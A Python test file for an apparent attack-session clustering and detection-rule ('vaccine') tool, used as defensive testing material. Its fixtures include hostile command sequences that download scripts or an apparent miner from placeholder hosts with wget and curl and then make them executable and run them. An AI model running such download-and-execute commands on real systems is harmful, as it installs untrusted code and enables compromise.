from nexus_shield import analysis, vaccine
from tests.helpers import ev


def test_fuzzy_cluster():
    a = ev(["root", "wget http://a/x.sh", "chmod +x x.sh"])
    b = ev(["root", "wget http://b/y.sh", "chmod +x y.sh", "sh y.sh"])
    c = ev(["uname -a", "cat /proc/cpuinfo", "curl http://z/xmr"])
    assert analysis.cluster([a, b, c]) == [[0, 1], [2]]


def test_automation_flag():
    assert analysis.features(ev(["a1x", "b2y", "c3z"], 0.05))["automated"]
    assert not analysis.features(ev(["a1x", "b2y", "c3z"], 3.0))["automated"]


def test_vaccine_excludes_benign_and_validates():
    mal = [ev(["root", "wget http://a/bot.sh", "chmod +x bot.sh"]) for _ in range(5)]
    ben = [ev(["alice", "ls", "pwd", "wget docs"], 3.0)]
    v, rep = vaccine.validate(mal, ben)
    assert "wget" not in v["tokens"] and rep["safe_to_deploy"]
    assert not any(vaccine.matches(v, b) for b in ben)


def test_not_enough_data_is_not_deployable():
    assert not vaccine.validate([ev(["root", "wget x"])], [])[1]["safe_to_deploy"]


def test_vaccine_blocks_false_positive_deploy():
    mal = [ev(["root", "chmod 777 x"]) for _ in range(5)]
    ben = [ev(["root", "chmod 777 x"], 3.0)]  # benign identical to malicious: tokens stripped, no rule
    v, rep = vaccine.validate(mal, ben)
    assert not rep["safe_to_deploy"]
